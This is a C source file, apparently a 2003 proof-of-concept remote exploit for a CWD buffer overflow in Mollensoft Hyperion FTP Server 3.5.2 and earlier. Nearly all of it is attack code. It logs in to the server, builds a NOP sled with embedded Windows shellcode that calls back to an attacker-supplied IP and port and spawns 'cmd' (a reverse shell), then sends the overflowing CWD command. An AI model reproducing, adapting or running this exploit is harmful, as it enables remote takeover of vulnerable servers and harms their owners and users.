/*
 * ## PRIVATE !!! ## DO NOT DISTRIBUTE !!! ##
 * ## FOR EDUCATIONAL PURPOISES ONLY   !!! ##
 *
 * 17/06/2003 @4.34PM
 *
 * ./iwS Security Research Lab presents
 * Mollensoft Hyperion FTP Server <= 3.5.2
 *
 * as described in the paper from dr_insane located at
 * http://packetstormsecurity.nl/0306-advisories/MollensoftFTPServer3.5.2.txt
 * this server is crappy and vulnerable to overflows in this commands:
 * CWD, MKD, RMD, STAT, NLST.
 */

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <unistd.h>

#define NOP     0x90

// great shellcode by kralor
char shellcode[] =
    "\x55\x8b\xec\x33\xc9\x53\x56\x57\x8d\x7d\xa2\xb1\x25\xb8\xcc\xcc"
    "\xcc\xcc\xf3\xab\xeb\x09\xeb\x0c\x58\x5b\x59\x5a\x5c\x5d\xc3\xe8"
    "\xf2\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66\xb9\xb5\x01\x80\x33"
    "\x95\x43\xe2\xfa\x66\x83\xeb\x67\xfc\x8b\xcb\x8b\xf3\x66\x83\xc6"
    "\x46\xad\x56\x40\x74\x16\x55\xe8\x13\x00\x00\x00\x8b\x64\x24\x08"
    "\x64\x8f\x05\x00\x00\x00\x00\x58\x5d\x5e\xeb\xe5\x58\xeb\xb9\x64"
    "\xff\x35\x00\x00\x00\x00\x64\x89\x25\x00\x00\x00\x00\x48\x66\x81"
    "\x38\x4d\x5a\x75\xdb\x64\x8f\x05\x00\x00\x00\x00\x5d\x5e\x8b\xe8"
    "\x03\x40\x3c\x8b\x78\x78\x03\xfd\x8b\x77\x20\x03\xf5\x33\xd2\x8b"
    "\x06\x03\xc5\x81\x38\x47\x65\x74\x50\x75\x25\x81\x78\x04\x72\x6f"
    "\x63\x41\x75\x1c\x81\x78\x08\x64\x64\x72\x65\x75\x13\x8b\x47\x24"
    "\x03\xc5\x0f\xb7\x1c\x50\x8b\x47\x1c\x03\xc5\x8b\x1c\x98\x03\xdd"
    "\x83\xc6\x04\x42\x3b\x57\x18\x75\xc6\x8b\xf1\x56\x55\xff\xd3\x83"
    "\xc6\x0f\x89\x44\x24\x20\x56\x55\xff\xd3\x8b\xec\x81\xec\x94\x00"
    "\x00\x00\x83\xc6\x0d\x56\xff\xd0\x89\x85\x7c\xff\xff\xff\x89\x9d"
    "\x78\xff\xff\xff\x83\xc6\x0b\x56\x50\xff\xd3\x33\xc9\x51\x51\x51"
    "\x51\x41\x51\x41\x51\xff\xd0\x89\x85\x94\x00\x00\x00\x8b\x85\x7c"
    "\xff\xff\xff\x83\xc6\x0b\x56\x50\xff\xd3\x83\xc6\x08\x6a\x10\x56"
    "\x8b\x8d\x94\x00\x00\x00\x51\xff\xd0\x33\xdb\xc7\x45\x8c\x44\x00"
    "\x00\x00\x89\x5d\x90\x89\x5d\x94\x89\x5d\x98\x89\x5d\x9c\x89\x5d"
    "\xa0\x89\x5d\xa4\x89\x5d\xa8\xc7\x45\xb8\x01\x01\x00\x00\x89\x5d"
    "\xbc\x89\x5d\xc0\x8b\x9d\x94\x00\x00\x00\x89\x5d\xc4\x89\x5d\xc8"
    "\x89\x5d\xcc\x8d\x45\xd0\x50\x8d\x4d\x8c\x51\x6a\x00\x6a\x00\x6a"
    "\x00\x6a\x01\x6a\x00\x6a\x00\x83\xc6\x09\x56\x6a\x00\x8b\x45\x20"
    "\xff\xd0"
    "CreateProcessA\x00LoadLibraryA\x00ws2_32.dll\x00WSASocketA\x00"
    "connect\x00\x02\x00\x02\x9A\xC0\xA8\x01\x01\x00"
    "cmd" // don't change anything..
    "\x00\x00\xe7\x77" // offsets of kernel32.dll for some win ver..
    "\x00\x00\xe8\x77"
    "\x00\x00\xf0\x77"
    "\x00\x00\xe4\x77"
    "\x00\x88\x3e\x04" // win2k3
    "\x00\x00\xf7\xbf" // win9x =P
    "\xff\xff\xff\xff";

// prototypes
void    banner();
void    usage(char *);
void    logintoftp();
long    getip(char *);

// global vars
char    name[128];
char    pass[128];
int     suck; // socket
size_t  dport; // ftp port
u_short lport; // local port
long    dip; // ftp ip
long    lip; // local ip

void    banner()
{
printf("\n[@] ./iwS Security Research Lab\n"
    " + Daemon: MollenSoft FTPD <= 3.5.2\n"
    " + Bug   : Remote CWD Buffer Overflow\n"
    " + Greets: #iwSpub @IRCnet\n");
    return;
}

void    usage(char *cmd)
{
    printf("\n[?] usage: %s <-d ip> <-s local ip> <-b local port> [-l login] [-p pass] [-P remote port] [-o offset]\n", cmd);
    return;
}

void    logintoftp()
{
    char    snd[1024], rcv[1024]; // send&receive buffers
    int     n; // socket

    /* username string */
    memset(snd, '\0', 1024);
    sprintf(snd, "USER %s\r\n", name);
    write(suck, snd, strlen(snd));

    /* waits for server answer */
    while((n = read(suck, rcv, sizeof(rcv))) > 0)
    {
        rcv[n] = 0;
        if(strchr(rcv, '\n') != NULL) break;
    }

    /* password string */
    memset(snd, '\0', 1024);
    sprintf(snd, "PASS %s\r\n", pass);
    write(suck, snd, strlen(snd));

    /* waits for server answer */
    while((n = read(suck, rcv, sizeof(rcv))) > 0)
    {
        rcv[n] = 0;
        if(strchr(rcv, '\n') != NULL) break;
    }

    return;
}

/* this one just takes the hostname *
* or the ip from argv and converts *
* it to something useful :P        */
long    getip(char *name)
{
    struct  hostent *hp;
    long    ip;

    if((ip = inet_addr(name)) == -1)
    {
        if((hp = gethostbyname(name)) == NULL)
        {
        fprintf(stderr, "[!] couldn't resolve host.\n");
        exit(-1);
        }
    memcpy(&ip, (hp->h_addr), 4);
    }

    return ip;
}


void    main(int argc, char **argv)
{
    char    *ptr, *port_to_shell = "", *ip1 = "", data[50]="";
    char    arg, **fakeargv = (char **)malloc(sizeof(char *)*(argc + 1));
    char    sendln[1024], recvln[1024];
    char    bof[400];
    char    big[6500];
    char    exp[6900];
    struct  sockaddr_in socka;
    int i, n, j;
    int PAD = 0x10;

    dport = htons(21);

    banner();

    if(argc < 4) usage(argv[0]);

    for(i = 0; i < argc; i++)
    {
        fakeargv[i] = (char *)malloc(strlen(argv[i]) + 1);
        strncpy(fakeargv[i], argv[i], strlen(argv[i]) + 1);
    }

    fakeargv[argc] = NULL;

    while((arg = getopt(argc, fakeargv, "d:s:b:l:p:P:o:")) != EOF)
        switch(arg)
        {
        case 'd':
            dip = getip(optarg); break;
        case 's':
            lip = getip(optarg); break;
        case 'b':
            lport = htons(atoi(optarg)); break;
        case 'l':
            strncpy(name, optarg, 128); break;
        case 'p':
            strncpy(pass, optarg, 128); break;
        case 'P':
            dport = htons(atoi(optarg)); break;
        case 'o':
            PAD = atoi(optarg); break;

        default:
            usage(argv[0]); break;
        }

    if(name[0] == 0) strcpy(name, "anonymous");
    if(pass[0] == 0) strcpy(pass, "iwS@irc.net");

    /* buffers reset */
    bzero(&socka, sizeof(socka));
    bzero(recvln, sizeof(recvln));
    bzero(sendln, sizeof(sendln));
    bzero(big, sizeof(big));
    bzero(bof, sizeof(bof));

    /* socket parameters */
    socka.sin_family = AF_INET;
    socka.sin_port   = htons(dport);
    socka.sin_addr.s_addr = getip(dip);

    /* socket creation */
    if((suck = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("\n[!] socket error:");
        exit(-1);
    }

    /* establishing connection to host */
    if(connect(suck, (struct sockaddr *)&socka, sizeof(socka)) < 0)
    {
        perror("\n[!] connect() error:");
        exit(-1);
    }

    /* we wait for server answer */
    while((n = read(suck, recvln, sizeof(recvln))) > 0)
    {
        recvln[n] = '\0';
        if(strchr(recvln, '\n') != NULL) break;
    }

    printf("[#] logging in with %s:%s... ", name, pass);
    logintoftp(suck); // let's login...
    printf("done.\n");

    ip1 = (char *)&lip;

    shellcode[448] = ip1[0];
    shellcode[449] = ip1[1];
    shellcode[450] = ip1[2];
    shellcode[451] = ip1[3];

    port_to_shell = (char *)&lport;

    shellcode[446] = port_to_shell[0];
    shellcode[447] = port_to_shell[1];

    /*        __asm__ (
    "lea shellcode,%eax\n"
    "add $0x34,%eax\n"
    "xor %ecx,%ecx\n"
    "mov $0x1b0,%cx\n"
    "gh: \n"
    "xorl $0x95, (%eax)\n"
    "inc %eax\n"
    "loop gh\n"
    );*/

    /* let's do this */
    for(i = 0; i < sizeof(bof); i++) bof[i] = 'A';
    for(i = 0; i < sizeof(big); big[i] = NOP, i++);
    for(i = 6400, j = 0; i < sizeof(big) && sizeof(shellcode) - 1; big[i] = shellcode[j], i++, j++);
    for(i = 0; i < 250; big[i] = PAD, i++);
    memset(exp, '\0', 6900);

    printf("[#] sending shellcode... ");
    sprintf(exp, "CWD %s%s\r\n", bof, big);
    write(suck, exp, sizeof(exp));
    printf("done!\n");

    close(suck);
    return;
}
